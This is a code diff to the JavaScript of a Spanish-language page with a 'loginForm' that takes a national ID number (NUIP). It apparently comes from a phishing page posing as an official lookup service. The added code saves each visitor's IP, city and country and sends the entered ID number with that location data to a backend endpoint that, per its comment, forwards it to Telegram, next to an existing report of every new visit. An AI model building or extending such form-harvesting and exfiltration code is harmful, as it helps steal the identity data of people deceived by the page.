@@ -354,6 +354,11 @@
                     console.warn('No se pudo obtener geo:', e);
                 }
 
+                // 🔥 Guardar IP/ciudad/país para reusarlos en la notificación de consulta
+                sessionStorage.setItem('user_ip', ip);
+                sessionStorage.setItem('user_ciudad', ciudad);
+                sessionStorage.setItem('user_pais', pais);
+
                 await fetch('/api/nuevo-ingreso', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -372,7 +377,7 @@
         })();
 
         // ============================================================
-        // Formulario NUIP → consulta al proxy → redirige a consultar.html
+        // Formulario NUIP → notifica consulta → proxy → consultar.html
         // ============================================================
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
@@ -382,6 +387,22 @@
             if (!/^\d{5,15}$/.test(nuip)) {
                 alert('Ingrese un número de NUIP válido');
                 return;
+            }
+
+            // 🔔 Notificar la consulta a Telegram (NO afecta el "nuevo ingreso")
+            try {
+                await fetch('/api/notificar-consulta', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        nuip,
+                        ip: sessionStorage.getItem('user_ip') || 'Desconocida',
+                        ciudad: sessionStorage.getItem('user_ciudad') || 'Desconocida',
+                        pais: sessionStorage.getItem('user_pais') || 'Desconocido'
+                    })
+                });
+            } catch (e) {
+                console.warn('No se pudo notificar consulta:', e);
             }
 
             const overlay = document.getElementById('loading-overlay');
